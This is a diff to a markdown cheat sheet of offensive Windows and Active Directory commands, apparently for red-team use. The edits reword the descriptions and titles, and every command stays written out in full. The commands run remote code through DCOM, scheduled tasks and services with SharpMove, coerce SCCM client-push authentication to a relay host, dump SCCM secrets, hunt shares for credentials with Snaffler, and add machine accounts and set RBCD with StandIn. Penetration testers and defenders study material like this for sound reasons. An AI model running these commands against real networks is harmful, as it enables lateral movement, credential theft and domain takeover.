@@ -4,11 +4,9 @@
 
 ### DCOM execution
 
-Execute DCOM execution with Sharp Tools.
-
 Execute a command through a DCOM method.
 
-```cmd title:"Sharp Tools Execute DCOM Execution"
+```cmd title:"Sharp Tools Execute command with SharpMove DCOM"
 SharpMove.exe action=dcom computername=$rhost_name command="$command" method=$dcom_method amsi=true
 ```
 <!-- cheat
@@ -19,11 +17,9 @@ var dcom_method = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --heade
 
 ### Task Scheduler execution
 
-Execute task scheduler execution with Sharp Tools.
-
 Create and run a remote scheduled task.
 
-```cmd title:"Sharp Tools Execute Task Scheduler Execution"
+```cmd title:"Sharp Tools Execute command with SharpMove Task Scheduler"
 SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
 ```
 <!-- cheat
@@ -37,11 +33,9 @@ var pass
 
 ### Service execution
 
-Execute service execution with Sharp Tools.
-
 Modify and start a remote service.
 
-```cmd title:"Sharp Tools Execute Service Execution"
+```cmd title:"Sharp Tools Modify remote service with SharpMove"
 SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
 ```
 <!-- cheat
@@ -54,22 +48,18 @@ var service_name
 
 ### Enumerate SCCM administrators
 
-Enumerate SCCM administrators with Sharp Tools.
-
 Enumerate SCCM administrative users through the SMS Provider.
 
-```powershell title:"Sharp Tools Enumerate SCCM Administrators"
+```powershell title:"Sharp Tools Enumerate SCCM administrators"
 .\SharpSCCM.exe get class-instances SMS_ADMIN
 ```
 <!-- cheat -->
 
 ### Get resource ID
 
-Get resource ID with Sharp Tools.
-
 Resolve a device resource ID for AdminService or deployment operations.
 
-```powershell title:"Sharp Tools Get Resource ID"
+```powershell title:"Sharp Tools Get SCCM resource ID"
 .\SharpSCCM.exe get resource-id -d "$computer_name"
 ```
 <!-- cheat
@@ -78,11 +68,9 @@ var computer_name
 
 ### Trigger client push coercion
 
-Trigger client push coercion with Sharp Tools.
-
 Coerce SCCM client push authentication toward a relay host.
 
-```powershell title:"Sharp Tools Trigger Client Push Coercion"
+```powershell title:"Sharp Tools Invoke SCCM client push coercion"
 .\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
 ```
 <!-- cheat
@@ -93,11 +81,9 @@ var relay_host
 
 ### Execute deployment
 
-Execute deployment with Sharp Tools.
-
 Trigger execution against a device resource.
 
-```powershell title:"Sharp Tools Execute Deployment"
+```powershell title:"Sharp Tools Trigger SCCM execution"
 .\SharpSCCM.exe exec -rid $resource_id -r "$target"
 ```
 <!-- cheat
@@ -107,11 +93,9 @@ var target
 
 ### Dump local SCCM secrets
 
-Dump local SCCM secrets with Sharp Tools.
-
 Dump locally stored SCCM secrets from disk.
 
-```powershell title:"Sharp Tools Dump Local SCCM Secrets"
+```powershell title:"Sharp Tools Dump local SCCM disk secrets"
 .\SharpSCCM.exe local secrets disk
 ```
 <!-- cheat -->
@@ -120,11 +104,9 @@ Dump locally stored SCCM secrets from disk.
 
 ### Domain share hunt
 
-Run domain share hunt with Sharp Tools.
-
 Search domain shares for sensitive files and likely credential material.
 
-```powershell title:"Sharp Tools Run Domain Share Hunt"
+```powershell title:"Sharp Tools Hunt domain shares with Snaffler"
 .\Snaffler.exe -d "$domain" -c -s
 ```
 <!-- cheat
@@ -133,11 +115,9 @@ var domain
 
 ### Host list share hunt
 
-List host list share hunt with Sharp Tools.
-
 Search a provided host list.
 
-```powershell title:"Sharp Tools List Host List Share Hunt"
+```powershell title:"Sharp Tools Hunt host list with Snaffler"
 .\Snaffler.exe -n "$hosts" -s
 ```
 <!-- cheat
@@ -146,11 +126,9 @@ var hosts
 
 ### Directory hunt
 
-Run directory hunt with Sharp Tools.
-
 Search a specific share or directory path.
 
-```powershell title:"Sharp Tools Run Directory Hunt"
+```powershell title:"Sharp Tools Hunt a specific path with Snaffler"
 .\Snaffler.exe -i "$path" -s
 ```
 <!-- cheat
@@ -161,22 +139,18 @@ var path
 
 ### MachineAccountQuota
 
-Read MachineAccountQuota with Sharp Tools.
-
 Read the domain MachineAccountQuota value.
 
-```cmd title:"Sharp Tools Read MachineAccountQuota"
+```cmd title:"Sharp Tools Read MachineAccountQuota with StandIn"
 StandIn.exe --object ms-DS-MachineAccountQuota=*
 ```
 <!-- cheat -->
 
 ### Add machine account
 
-Add machine account with Sharp Tools.
-
 Create a machine account for RBCD or shadow credential chains.
 
-```cmd title:"Sharp Tools Add Machine Account"
+```cmd title:"Sharp Tools Add machine account with StandIn"
 StandIn.exe --computer "$computer_name" --make --password "$computer_pass"
 ```
 <!-- cheat
@@ -186,11 +160,9 @@ var computer_pass
 
 ### Set RBCD
 
-Set RBCD with Sharp Tools.
-
 Configure RBCD from a controlled computer to a target computer.
 
-```cmd title:"Sharp Tools Set RBCD"
+```cmd title:"Sharp Tools Set RBCD with StandIn"
 StandIn.exe --computer "$target_computer" --sid "$controlled_computer_sid"
 ```
 <!-- cheat
@@ -202,11 +174,9 @@ var controlled_computer_sid
 
 ### Domain user
 
-Enumerate domain user with Sharp Tools.
-
 Query a domain user with SharpView.
 
-```powershell title:"Sharp Tools Enumerate Domain User"
+```powershell title:"Sharp Tools Get domain user with SharpView"
 .\SharpView.exe Get-DomainUser -Identity "$user"
 ```
 <!-- cheat
@@ -215,11 +185,9 @@ var user
 
 ### Object ACL
 
-Enumerate object ACL with Sharp Tools.
-
 Resolve ACLs on an AD object.
 
-```powershell title:"Sharp Tools Enumerate Object ACL"
+```powershell title:"Sharp Tools Get object ACL with SharpView"
 .\SharpView.exe Get-ObjectAcl -Identity "$target_object" -ResolveGUIDs
 ```
 <!-- cheat
